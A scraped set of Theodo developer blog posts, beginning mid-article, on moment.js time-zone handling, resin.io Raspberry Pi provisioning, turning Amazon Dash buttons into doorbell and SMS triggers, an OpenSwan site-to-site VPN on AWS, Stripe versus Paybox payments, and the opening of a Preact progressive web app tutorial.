// momentObject(2018-01-27T10:30:00.000)

According to the timezone
We created a moment object which corresponds to the string. But let’s see the result in our example with a server A in Reunion (UTC+04:00) and a server B in France (UTC+01:00). If A sends a string  2018-01-27 10:30 to B, A wants to share 2018-01-27 6:30+00:00, but B will understand 2018-01-27 9:30+00:00.

By default, moment parses the date with the machine local time (either the user or the server). You can get the local utcOffset in minutes with moment.utcOffset(). So if you don’t specify the timezone, the date will not be correctly parsed. You had to specify it using moment-timezone instead of moment.

 const moment = require('moment')
 const momentTz = require('moment-timezone')

 const dateToStore = '2018-01-27 10:30'
 moment().utcOffset(); // 60 minutes
 const timeZone = 'Indian/Reunion' // 'UTC+04:00'

 const momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')
 //momentObject(2018-01-27T10:30:00+01:00)
 
 const momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)
 //momentObject(2018-01-27T10:30:00+04:00)

Better cases
In this case, the external API sends the date without any timezone and not in UTC. The best practice is to send the date in UTC or at least with the offset from UTC so that the receiver does not have to handle timezone. In these better cases, you can parse the date string using moment.utc() or moment.parseZone() or either moment(date,'YYYY-MM-DD HH:mm:ssZZ').

const moment = require('moment')

const receveidDateInUTC= '2018-01-27 6:30:00+00:00'
const receveidDateWithTimeZone = '2018-01-27 10:30:00+04:00'

moment(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')
// momentObject(2018-01-27T7:30:00+01:00)

moment.utc(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')
// momentObject(2018-01-27T6:30:00+00:00)

moment(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')
// momentObject(2018-01-27T7:30:00+01:00)

moment.parseZone(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')
// momentObject(2018-01-27T10:30:00+04:00)

As you can see, there are a number of ways to parse the same date.
That is why it is a best practice to store and send your date in UTC.
Use Coordinated Universal Time (UTC)
To make the data portable I would recommend storing the datetime in UTC. It is the international time standard that expresses dates without offsets and does not adjust for daylight savings. To do this, I use the moment.utc()  function which converts a moment object in UTC.

const momentTz = require('moment-timezone')

const dateToStore = '2018-01-27 10:30'
const timeZone = 'Indian/Reunion' // 'UTC+04:00'

const momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)
// momentObject(2018-01-27T10:30:00+04:00)

const momentDateTzUTC = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone).utc()
// momentObject(2018-01-27T06:30:00+00:00)

Finally you can store the date as a TIMESTAMP_WITH_TIMEZONE attribute in your database.
Display a date
Set the local time
I created a service in my application which provides a function to format dates. We received the date from our back-end in UTC. But depending on where the person is, the locals are not the same. The locals contain informations about linguistic, cultural, and technological conventions and standards. That is why the first thing to do is to set the local time. I got the local time with the library react-native-device-info and then I set the local time with moment.locale().

const moment = require('moment')
const DeviceInfo = require('react-native-device-info');

const date = '2018-01-27T10:30:00+00:00'
moment.locale() // 'fr'
moment(date).format('DD MMMM') // 27 Janvier

const local = DeviceInfo.getDeviceLocale() // 'en'
moment.locale(local)

moment(date).format('DD MMMM') // 27 January

Format the date
Finally, I create one function for each format I had.

const plainTextDateTime = dateTime => {
return moment(dateTime).format('DD MMMM HH:mm a') // 27 January 10:30 am
}
const getDate = dateTime => {
return moment(dateTime).format('DD MMMM') // 27 January
}
const getTime = dateTime => {
return moment(dateTime).format('HH:mm a') // 10:30 am
}

Date manipulation
Moment provides a core of manipulating functions as comparison, addition and subtraction functions. It is really easy to use. The main issue is that moment objects are mutable.
For example, if you want to know if a date is in less than one hour, you have two options :

//option 1
const myDate = moment('2018-01-27 10:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');
if (myDate.isBefore(moment().add(1,'hour'))) {
// myDate is less than one hour
}

//option 2
const now = moment();
const myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');
if (myDate.subtract(1,'hour').isBefore(now)) {
// myDate is less than one hour
}
console.log(myDate.format())
// myDate has been muted => 2018-01-27T05:30:00+00:00

With the first option, you add one hour to moment() which is not a problem because you don’t keep this value in memory. But with the second option, the value of myDate has changed which is not what you expected. You need to clone the value of myDate before manipulating this value.

//option 2
const myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');
if (myDate.clone().subtract(1,'hour').isBefore(moment())) {
// myDate is less than one hour
}
console.log(myDate.format())
// myDate has NOT been muted => 2018-01-27T06:30:00+00:00

Conclusion
To conclude, a date has four states for the same data:

The received state as a string: parse the date in order to have the correct moment object
The storage state: store your data in UTC or at least with the time zone (TIMESTAMP WITH TIME ZONE in postgreSql)
The manipulation state: manipulate your dates with date object. If you are using moment, clone the object before manipulating.
The displaying state: set the local time and create a service to handle the different representation in your application.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Dufour
  			
  				Developer at Theodo.  			
  		
    
			

									"
"
										An IOT Container Engine
When preparing a company-wide IOT(Internet of Things) hackathon I wanted to ensure all the Raspberry Pi devices we planned to use were ready for people to throw code at without needing monitors, keyboards, setting up ssh keys and getting frustrated by time wasted to getting to hello world.
I thought, we must have got further than this by now, with AWS I can spin up a complete load balanced server anywhere in the world in a matter of minutes…
And we have got further…
Resin.io brings simplicity to one of the most challenging and for me boring aspects of IOT; provision of devices. More than simplifying life for developers who want to build awesome products, it provides the tools to deal with real life IOT applications at scale.  – For example fleet wide deployments ready at the click of a button.
So let’s get to Hello World.
Go to resin.io and sign up for free.
Create a new application, selecting the IOT device you want to use (note this does not seem to be editable later), in our case a Raspberry Pi 3.

Now click, add a device, keep the defaults and click download the OS.

While that’s downloading, install etcher.io. Etcher. An open source tool from resin.io that allows you to easily burn images.
Now plug in your SD card, open Etcher and select the file you downloaded for the SD card you just plugged in and wait…
While your waiting let’s make an ssh key for our resin account:
ssh-keygen -t rsa -b 4096 -C “YOUR_EMAIL_ADDRESS”
Give a file name at the prompt.
Now copy the ssh public key: pbcopy < ~/.ssh/id_rsa_theodo_pi.pub 
Go onto the dashboard and click add manual ssh key (or you could import keys from GitHub, but that feels weird to me!)
Now, back to the main event!
Go back to the resin.io dashboard and refresh.

You should now see your device!
Click on the device and you can open the logs and console of the device or docker container inside.
Now let’s say hello
Resin provide a simple hello world boilerplate for the PI3 so lets clone:
git clone https://github.com/resin-io-projects/simple-server-node.git
We can now cd into this and add a remote directory as shown in the top right of the dashboard: git remote add resin USERNAME@git.resin.io:USERNAME/APPNAME.git
The first push will take some time (5 min), but docker container sharing will speed this up next time.
 
Also, the completion mascot is awesome!
Now, got to the IP address of your device in your browser and see the amazing words “Hello World!”.
Note: Depending on the config you used you could have set public HTTP forwarding for this device. This is a great feature but depending on your network could be a vulnerability to your home/office and I advise you close this unless you need it. You can turn this off in the actions section of the dashboard.
Let’s get personal
 
Hello world is great, but I prefer to be called by name. So time to push an update.
Edit the server.js file to say “Hello Ben” (or your name if you prefer).
Again, git push resin master and you’ll have your update in no time.
 
So this is way easier than it used to be, but if it’s still to slow a feedback loop for you how about hot reloading of your local code to one of your fleet devices?
Resin Sync to the rescue https://docs.resin.io/tools/cli/#sync-uuid-
In Conclusion:
Resin can takes the headache out of basic IOT provisioning.
At scale, it can allow a whole fleet of devices to be provisioned, updated, managed and debugged.
The use of docker allows a consistent build process across projects and fast deployments.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				I'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. 

I'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.

https://www.linkedin.com/in/benjaminellerby/  			
  		
    
			

									"
"
										A few years ago Amazon came out with the Amazon Dash Button, a small internet connected button that can be used to reorder common household items. Such a small, cheap and well-made internet connected button seems like a godsend for the IOT developer community – but they are not intended for use outside of product ordering. Amazon did release an IOT version of the Dash button, but at 4 times the price point it’s less attractive.
Could we intercept the network requests from Dash buttons and trigger our own custom events? An IOT doorbell, office coffee emergency button… That’s the challenge we set ourselves.
Connect the Dash Button to WiFi
Open up your Amazon app on IOS or Android, turn on Bluetooth and add the device. Be sure to quit the process once it’s connected to the internet but before you select a specific product!
Now your button is online.
Getting the MAC address of the button
The Dash Button is asleep most of the time, meaning when you press the button it must connect to the LAN over WiFi and then send its API request. Therefore it needs to acquire an IP address.
On an IPv4 network, Dynamic Host Configuration Protocol (DHCP) is used to get an address, and this process includes an Address Resolution Protocol (ARP) request. Our plan is to place a Raspberry Pi device on the LAN to watch for such ARP requests from our Dash buttons, allowing us to then trigger actions.
From our laptop on the same network, we can watch broadcast packets on the network using tcpdump.To watch for ARP request packets we can run:

tcpdump -ve arp | awk '{print $2}

(on Mac)

the -v option gives us a verbose output
the -e option displays the MAC addresses
the awk script prints out just the MAC address column.

There will likely be many busy devices cluttering up your network so run this, press the dash button, wait 30 seconds and then look at the list of MAC addresses captured.
Part of the MAC address specification includes the manufacturers ID so we can go to an online tool such as macvendors.com and lookup each of the addresses we found. The one that has the manufacturer as Amazon Technologies Inc. is what you’re looking for. Make a note of the address in question, and if you’re looking to setup multiple devices use the same process.
If you have other Amazon devices on your network this process may take more trial and error.
Triggering an action
We can write a short bash script, using a similar approach to above, that will trigger an action whenever the button is pressed.

#!/bin/bash
button='ENTER_THE_MAC_ADDRESS'
tcpdump -l -n -i en0 | while read b; do
  if echo $b | grep -q $button ; then
    echo ""Trigger Action""
  fi
done


button is the MAC address from the step above
tcpdump is passed an interface using the -i option. en0 or eth0 will likely work for you, but use ifconfig to find you LAN ethernet interface.
We’re piping into a while loop to get around some issues with evaluating our post grep action.

We can now trigger any action based on the pressing of the button. This could be an SMS using Twilio, an email, voice announcement using espeak, an AWS Lambda function… the world’s your limit!
Making a doorbell
If we want our doorbell to drop us an SMS we can sign up for Twilio’s programmable SMS service.
Then we can adapt our script to include a curl request as follows:

#!/bin/bash
button='ENTER_THE_MAC_ADDRESS'

tcpdump -l -n -i en0 | while read b; do
  if echo $b | grep -q $button ; then
    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \
    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \
    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \
    --data-urlencode 'Body=Let Me In! 🚪' \
    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY
    echo ""There is someone at the door"" | say
  fi
done


$YOUR_ACCOUNT_ID you can get from the Twilio site.
$YOUR_PHONE_NUMBER is the number of the phone to be texted when the doorbell is rung.
$YOUR_TWILLIO_PHONE_NUMBER is the phone number given to you by Twilio.
$ YOUR_TWILLIO_API_KEY you can get from the Twilio site.

The Twilio getting started console can help you build such a request body.
Deploying to the Raspberry Pi
Pro Tip: You’ll have better performance regarding latency and reliability with a direct ethernet connection to the LAN router.
Resin.io is an amazing tool when it comes to IOT provisioning. Follow my steps in the article, ‘IOT Provisioning As A Service”, I wrote the day before the hackathon on setting up a Raspberry Pi without the headache. The next steps will assume you’re using resin.io with the docker image from that article.
Edit the Dockerfile.template to install tcpdump and curl by adding the following lines:

RUN apt-get update
RUN apt-get install tcpdump curl

Now change the run line at the bottom of the template to CMD [“./main.sh”] where “main.sh” is the name of the script.
We can now git add and commit to the master branch, and git push to your remote resin repository as discussed in the article from above.
On the resin.io dashboard we can watch the deployment and debug any issues (e.g. the interface name eth0 or en0 is wrong for the Pi environment).
Press the button…
And…
Get several notifying text messages.
Dealing with multiple notifications
Several ARP requests can be received when the button is pressed due to the nature of the DHCP handshake. You can use a sleeping period to prevent such issues, but for this proof of concept the repeats are fine for now. (Keep an eye on this space)
Getting chatty
Taking the concept further we can connect our Raspberry Pi to a speaker and use the espeak library to trigger text to speech notifications.
Once again edit the Dockerfiler.template to add:

'RUN apt-get install espeak'

Now we can add the following to the main.sh:

'echo ""There is someone at the door"" | espeak -v en-sc -a 200'

Coffee time ☕️
Taking the idea to another level let’s build a “coffee emergency button”.
In our office when the coffee runs out, it’s a big problem…


No coffee => slow devs => bad code.

We’re going to build an internet connected coffee emergency button that will go on top of the emergency coffee tin, sending an audio alert to the office and a text message to the coffee buyer.
To do this we need to add another MAC address to our script for the new button and change our main.sh file as follows:

tcpdump -l -n -i en0 | while read b; do
  if echo $b | grep -q $button ; then
    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \
    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \
    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \
    --data-urlencode 'Body=Let Me In! 🚪' \
    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY
    echo ""There is someone at the door"" | say
  fi
  if echo $b | grep -q $coffee_button ; then
    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \
    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \
    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \
    --data-urlencode 'Body=ORDER COFFEE ☕️🚨' \
    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY
    echo ""POTENTIAL COFFEE EMERGENCY AVERTED, BUYER NOTIFIED."" | say
    echo ""That was a close one."" | say
  fi
done

Conclusion
This solution was built during a Theodo Hackathon and has room for improvement, yet it does serve as a fully functional doorbell in our office and we’ve not run out of coffee since!
Hopefully you learned some networking, have ideas for your own projects and will build your own buttons.
Please leave your ideas and results in the comments below.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				I'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. 

I'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.

https://www.linkedin.com/in/benjaminellerby/  			
  		
    
			

									"
"
										Some third-parties only allow you to call their APIs if you are inside their network. This can make life difficult if your application is hosted on AWS.
The solution is to create a site-to-site VPN connection between your AWS Virtual Private Cloud (VPC) and the third-party’s corporate network.
There are two common ways to do that:

The AWS way, using AWS Managed VPNs
The DIY way, using a software VPN

I will touch on AWS Managed VPNs and then go through the steps of manually setting up a software VPN.
A Quick Word on AWS Managed VPNs
AWS has a Managed VPN service in which you create a Virtual Private Gateway in your AWS VPC, set up a Customer Gateway (representing the third-party) and create a VPN connection between the two.

This is by far the easiest and most robust solution.
However, it has one major limitiations that might make it unsuitable for your needs:
With AWS Managed VPNs, the VPN tunnel can only be initiated from the Customer Gateway, i.e. the third-party’s side!
As a result of this, there are only two situations in which you can use the AWS Managed VPN service:

Requests are initiated from the third-party to your AWS hosts and your hosts only serve the response
Requests are initiated from your AWS host to the third-party, but the third-party takes responsibility for keeping the VPN tunnel up.

They can do this by creating a “keep-alive” ping that is constantly sending traffic through the tunnel and blocks it from going down.
However, if anything were to interrupt the ping, your app will get cut off from their API and you will have to rely on the third-party to bring the connection back up. Therefore. this is not really a viable solution for production-grade.



If requests are initiated from your AWS servers to the third-party, and the third-party is unable or unwilling to take responsibility for keeping the tunnel open, then AWS-managed VPNs will not work and you will need to use an alternative solution.
How to set up a software VPN on AWS using Openswan
The rest of this article will walk you through setting up a site-to-site VPN connection using the Openswan software VPN.
At a high level, there are three steps:

Create an EC2 instance in AWS that will run the OpenSwan VPN
Install and set up OpenSwan on that EC2 instance
Debug if it doesn’t work on first try 😉


Part 1) Create an AWS EC2 instance to run Openswan

Open up your AWS console, go to the EC2 services and create a new instance:

Use the Amazon Linux AMI.
Make sure you create the instance in the same VPC as your web servers (assumed to be 172.31.0.0/16 in the diagram).
Make sure you create it inside a public subnet (172.31.1.0/24 in the diagram).
This will give it a direct route out to the internet through the VPC’s Internet Gateway.
Add a Name tag (e.g. “Openswan VPN”) and create a security group (e.g. “Openswan SG”)

This is going to be our VPN instance which will be responsible for establishing the VPN tunnel to the third-party.
In the EC2 dashboard, select your new VPN instance and choose: “Actions -> Network -> Change Source/Dest Checking” and make sure the status is “Disabled”. If it isn’t, click on “Yes, Disable”.

By default, AWS blocks any request to and from an EC2 instance that don’t have that instance as either the source or destination of the request. We need to disable this since we will be routing requests through this instance that have the 3rd-party as destination.


In the details of the VPN instance, you can see its Private IP.  Note this down.
In the diagram above we assume it’s 172.31.1.15
By default, instances in public subnets are allocated a public IP by AWS.
We could use this public IP for our VPN instance but it is much safer to allocate an Elastic IP for your instance:


On the sidebar, select Elastic IPs and allocate an Elastic IP to the VPN instance.



In the diagram, we have denoted it as EIP
We need to adjust the security group of our instance to accept traffic from your application:


Add an inbound rule that accepts traffic from inside your VPC (172.31.0.0/16 in our case)



The type of traffic will depend on what type of API requests you want to make. For most cases, a rule for HTTP and another for HTTPS traffic should be enough. If you want to enable pinging, you should also allow TCP traffic.
There is no need to explicitly add corresponding outbound rules.
Finally, we need to tell our VPC router to route all requests to the 3rd-party through our VPN instance:


Go to the VPC service and select Route Tables in the side bar.



Each subnet will be associated with a route table. For each route table that is associated with one of your public subnets, we need to add the following rule:

Destination: IP range of third-party network (10.0.1.0/24 in the diagram)
Target: {select your Openswan VPN instance from the dropdown}



Part 2) Install and Configure OpenSwan
We are done with the AWS console for now.
The next step is to log into the instance and set up Openswan itself.

SSH into the VPN instance: ssh ec2-user@{EIP}
Install openswan: sudo yum install openswan.
This will create an IPSec configuration file.
We need to edit it: sudo vi /etc/ipsec.conf
We want to include configuration files in /etc/ipsec.d/.
For this, you need to uncomment the last line:

 # /etc/ipsec.conf - Openswan IPsec configuration file
#
# Manual: ipsec.conf.5
#
# Please place your own config files in /etc/ipsec.d/ ending in .conf

version 2.0 # conforms to second version of ipsec.conf specification

# basic configuration
config setup
# Debug-logging controls: ""none"" for (almost) none, ""all"" for lots.
# klipsdebug=none
# plutodebug=""control parsing""
# For Red Hat Enterprise Linux and Fedora, leave protostack=netkey
protostack=netkey
nat_traversal=yes
virtual_private=
oe=off
# Enable this if you see ""failed to find any available worker""
# nhelpers=0

#You may put your configuration (.conf) file in the ""/etc/ipsec.d/"" and uncomment this.
include /etc/ipsec.d/*.conf


Next we create our VPN configuration in a new file: sudo vi /etc/ipsec.d/third-party-vpn.conf.
This part is the tricky bit.
You can start by pasting the following template and replacing the option values with the correct settings for your environment.“`bash
conn third-party # Name of the connection. You can call it what you like
type=tunnel
authby=secret
auto=start # load connection and initiate it on startup
# Network Info
left=%defaultroute
leftid={EIP} # Elastic IP of the VPN instance
leftsourceip=172.31.1.15 # Private IP of the VPN instance
leftsubnet=172.31.1.0/24 # IP range of your public subnet. Use this if you have a single public subnet.
# If you have multiple subnets, use “leftsubnets = {172.31.1.0/24 172.31.3.0/24 […]}”
leftnexthop=%defaultroute
right={3rd-party-PublicIP} # Public IP address of third-party’s VPN endpoint
rightid={3rd-party-PrivateIP} # Private IP address of third-party’s VPN endpoint if you have it
rightsubnet=10.0.1.0/24 # IP range of third-party network. Use “rightsubnets” if multiple subnets
# Security Info
ike=aes192-sha1;modp1536 # IKE Encryption Policy and Diffie-Hallman Group
ikelifetime=3600s # IKE Lifetime
esp=aes192-sha1;modp1536 # ESP Encryption policy and Diffie-Hallman Group
salifetime=43200s # IPSec Lifetime
pfs=yes # Perfect Forward Secrecy

“`

The configuration here needs to match what the third-party has set up on their side of the VPN connection.
In particular, make sure that IP addresses are correct and that both sides use the same authentication settings.
If you are interested to see what other options exist, take a look at the ipsec manual.


Note that we used the setting authby=secret.
This means that Openswan will use a “Pre-shared key” (PSK) to authenticate the connection.
A PSK is simply a secret that is shared between you and the other side.
We need to create a secrets file sudo vi /etc/ipsec.d/third-party-vpn.secrets and paste:
{EIP} {3rd Party Private IP}: PSK ""MY_SECRET_PRE_SHARED_KEY""

replacing {EIP}, {3rd Party Private IP} and MYSECRETPRESHAREDKEY with the correct values.
We can now start Openswan:

sudo service ipsec start # Start the service. This will try to establish the tunnel
sudo chkconfig ipsec on # Make sure OpenSwan starts on boot


Finally, since we will be using this instance as a router, we need to enable IP forwarding: sudo vi /etc/sysctl.conf and change the ip_forward option from 0 to 1:

net.ipv4.ip_forward = 1


Restart the network:

sudo service network restart

If everything went well, you should now have a working connection.
Part 3) Test the Connection
We will test the connection in this order:

Check that the VPN tunnel can be established
Test that you can connect to the 3rd-party from the VPN instance
Test that you can connect to the 3rd-party from your web servers


1. Test the VPN tunnel
You can check the status of the VPN tunnel using
sudo ipsec auto --status

If the tunnel is up, you should see a line beginning with the name of your connection (""third-party"" in our case) that contains the following statement near the end of the output:
IPsec SA established
If you don’t see this, the output should tell you how far into process it got and at what point the tunnel failed to build.
To get a few more logs, you can also try
sudo ipsec auto --replace third-party
sudo ipsec auto --up third-party

Make sure the security protocols and the PSK match what the 3rd party has.

The logs should tell you which of them don’t match

If the tunnel does not even begin the build process, you might be blocking traffic to/from the third party for you public subnets.

In the AWS console, in VPC -> subnets, check the Network ACL tab of your public subnets and make sure there are no rules that are blocking the traffic.
Check that the Openswan EC2 instance has the correct security group.
In particular, check that it’s not blocking traffic to the third-party.
Ask the third-party if they can see any attempts at building a VPN tunnel in their logs.

2. Test connectivity from the Openswan instance
Once the tunnel is established, you can start testing the connection between your VPN instance and the 3rd-party.
Ideally, you should attempt to make an HTTP or HTTPS request directly to the third-party API (e.g. using the curl command).
You can also try to ping a host in the 3rd-party network (for this, you need to allow TCP traffic in the instance’s security group).
If you get a response, congrats!
If not, try the following:

Double-check that your Network ACLs and Security Groups are not blocking your request.
Ask the 3rd-party to check that their firewall is not blocking your request.
If they are not seeing your requests, ask them to check their NAT-T configuration (this has caused me problems before when trying to connect to Cisco ASA devices)

NAT-T should be enabled on our side by default.
To check, look in /etc/ipsec.conf for the value of the nat_traversal option.



3. Test the connection from your web servers
Once you have connectivity between your Openswan instance and the 3rd party, you can finally test the connection from your web servers.
SSH into one of your web servers and try to make a request to the third-party API.
If you get a response, well done, you have come a long way!
You should verify that you can actually connect to the 3rd party from all of your web servers.
If you are running a massive fleet, at least check that the connection works from each subnet.
For those less fortunate of you, repeat the debug steps above.
In addition to that, you can also try the following:

Check that the routing is set up correctly:

In the AWS Console, check that the route table of your public subnets is set up correctly (see step 6 in part 1 above)
Try “traceroute <ip of third-party API server>“.
You should see that the first step in the route is the (private) IP of the OpenSwan instance.


It is always worth checking that your security groups are not blocking your traffic.
It could happen that only some but not all of your web servers are able to connect to the 3rd party.
In this case:

Check that the VPN is correctly configured to handle all of your public subnets.
In particular, you may need to use the “leftsubnets” instead of the “leftsubnet” option.
Check with the 3rd party that they have configured their side of the connection (both the VPN and the firewalls) for all of your public subnets.



Next Steps
Hopefully you should have a working VPN connection now.
However, our VPN configuration still has a lot of room for improvement.
The most urgent concern is that we have not set up any monitoring or automatic fall-backs for the VPN tunnel.
To do so, you would need to create and configure a second VPN instance.
Next, you could then setup a monitoring script on a separate instance that checks the state of each VPN tunnel.
If tunnel A goes down, the script should immediately adjust your route tables to reroute traffic through tunnel B while also trying to fix the tunnel A.
If you want to go down that rabbit-hole, I suggest you start with Appendix A of the AWS VPC connectivity options whitepaper.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Brian Azizi
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
As a way of getting incomes from your web application you often need to setup a way for your user to pay through your website.
Usually thanks to a form where your user will fill it’s banking information.
It may sounds like a big feature to implement but existing tools really ease the task.
On my project we’ve tried two of the main ones available : Stripe and Paybox.
And here’s how we quickly did it.
How to quickly setup Stripe on your app
Stripe provides an easy to setup REST API to allow secure online payment on your web app.
I’ve tried it on a Symfony 2.8 project and in half a day I was able to send and visualize test payment on the stripe dashboard.
First you need to create an account on Stripe which will give you access to the stripe dashboard where you can see all the transaction made.
With the creation of your account stripe provides you a test API key.
Then add in your composer require

{
  ""require"": {
  ""stripe/stripe-php"": ""4.*""
  }
}

and your API keys in your config.yml and start implementing the service which fits your needs.
To start making transaction you need to deal with the authentication to the Stripe API thanks to your API keys and to create a \Stripe\Charge object :

\Stripe\Charge::create(array(
  ""amount"" = round($price * 100),
  ""currency"" = ""usd"",
  ""customer"" = $customerId)
);

Stripe provides a standard online payment form but you can make your own custom one without any issue.
In that case you need to deal with Stripe tokenification, which add another security layer.
It’s usually done by a javascript script on the page of your form.
You can also directly install one of several Symfony bundle already implementing a service and a formType for the payment with javascript tokenification.
Which is a nice and quick way to do a proof of concept on the matter.
Troubleshooting
Stripe has an IRC channel where people quickly help you.
Feel free to contact them when encountering technical issue.
How to setup Paybox
Paybox is the French counterpart of Stripe, it’s less easy to setup and less developper friendly but it still provides a complete online payment solution in one day or so.
Why Paybox over Stripe ?
– You have better price on Paybox
– A big client can easily have a good price with a fix fee over a percntage for stripe.
– Paybox is a french solution so you can easily interact with them, call their technical support
How to quickly install it
You can install a Paybox bundle with composer.
I’ve chosen this one as the read me is explicit enough and close to the Paybox documentation.

composer require lexik/paybox-bundle

Then follow the read me on github to implement your online payment service.
Like Stripe, Paybox provides a dev and a prod environment.
On the dev environment you can simulate payment with fake credit card.
Troubleshooting
The online documentation is not always updated (we had some issues with correct request according to the documentation which triggered wrong http response).
You also have to choose one offer of Paybox among the three available and each offer works differently with different request.
In case of issue don’t hesitate to directly call their technical support.
Which one to choose
We’ve already covered the fact that Stripe is easier to implement than Pyabox
Availability
Both Solutions allow Visa, MasterCard and AmericanExpress and a large variety of other payment method.
Paybox offer is centralized on France so if your client want to charge customer outside of France you’d rather use Stripe.
Price
Stripe charges you a flat rate of 2.9% + 30¢ per successful charge as long as you’re doing under $1 million in volume per year.
Whereas Paybox offers you a monthly subscription (around 200€ TTC with 100 free transactions and then fix a fee of 0,85€ per transaction).
Note that you can bargain better prices with both solution.
As a result I would recommend using Paybox if your client needs a payment solution that involves numerous transaction and big amounts.
On the other hand if your client only want to have a quick online payment solution on a single project, it would be better to go for stripe.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ivann Morice
  			
  				  			
  		
    
			

									"
"
										This article will introduce you to the world of Progressive Web Apps, to the Preact framework and to Web APIs. It will guide you through 15 minutes of code to create your first Preact Progressive Web App!
Status of PWAs today
Progressive Web Apps are taking over the web! They are the future of desktop, mobile and native web applications. Multiple major companies are switching to PWAs for costs but also performance reasons: Twitter, Uber, l’Équipe…
But first, what is a Progressive Web App (PWA) ? A Progressive Web Application is a combination of the latest web technologies and good practices to implement. Most of the latter can be evaluated by the Lighthouse Chrome extension. And its extensive documentation will teach you a lot on how to improve you app.
Those practices will make your web application: Progressive, Responsive, Connectivity independent, App-like, Fresh, Safe, Discoverable, Re-engageable, Installable and Linkable. You can find a definition of each of those characteristics at Google’s. The combination of those characteristics result in one single web application that is lighter, faster to load, usable on any device, on low-quality networks and even offline. You can use the web framework of your choice and your app will be cross-platform and cross-devices. The most common frameworks for PWAs today are Angular, React, Vue.js and Ionic.

PWAs still suffer from a few limitations compared to native apps due to them being brand new. However, more and more Web APIs are announced at Google I/Os each year and Apple is now considering integrating one of the technologies that make up PWAs: the service workers.
Finally, even if you’re not aiming at replacing your native apps by a PWAs (yet!), implementing those good practices in your mobile and desktop web applications will help you drastically improve performances and maybe even positively impact your business. You can trust Algolia about its performance improvement and Google in its showcase for business impact.
This article is the first of a series that will show you how to create a new PWA from scratch using the Preact framework. Our final application will be a social media PWA where we can post photos that will be pinned on a map. The tutorial demonstrates how to use React packages in the Preact framework, and how easy it can be to use Web APIs in your PWA. The next parts in the series will teach you how to:

Connect your app to Firebase using ReactFire
Use the Geolocation Web API
Add Google Authentication
Set up the offline mode in your PWA
Improve the performances
Use push notifications
…

We also started writing a series of awesome articles on how to build a PWA using Vue.js, Webpack, Material Design and Firebase: Part 1, Part 2 and Part 3.
Why Preact?

Preact is a tiny 3KB alternative to React, meaning it is super light and fast, and it packs up most of React’s features, including the same API! You can check this article for a quick comparison and an example of how to switch from React to Preact. Preact aims to offer high performance rendering with an optional compatibility layer (preact-compat) that integrates well with the rest of the React ecosystem such as Redux.
Preact is thus perfectly suited for desktop and more specifically mobile web-apps used with poor data connection, and therefore for Progressive Web Apps. Multiple renowned companies are now using Preact in production, such as Uber, Housing.com and Lyft. You can have a more exhaustive list of them here. Addy Osmani did a quick review of the performances of the Treebo PWA and wrote: “Switching from React to Preact was responsible for a 15% improvement in time-to-interactive alone”. Preact helped them “getting their vendor bundle-size and JS execution time down”.
Our goals in this article
By the end of this article, after 15 minutes of coding, we will have:

A Progressive Web App based on Preact and webpack, scaffolded by preact-cli
A map displayed by the google-maps-react React package (Google Maps API)
A camera button (Material Design Lite)
A camera modal triggered by the camera button (Camera Web API)
The picture taken by the camera/webcam displayed on the map


Let’s code!
You can find the companion repository for this article here. I will also post the matching commits links along the article steps. However, I won’t linger on some commits related to code style and documentation. We will use yarn instead of npm in the examples. To install it you can refer to this page.
I wrote this article using the following versions:

node v8.1.2
preact v2.0.2
yarn v1.0.1

Scaffold your app
To begin, we need to install preact-cli and create our project:
yarn add preact-cli
preact create default pinpic
cd pinpic
yarn install
yarn dev


All this constitues our first commit. The project creation is pretty straightforward and won’t ask you anything other than the project name. After running yarn dev, you can now follow the link given to check the results of your developments in real-time on http://localhost:8080.
Check out the hot reload on your phone!
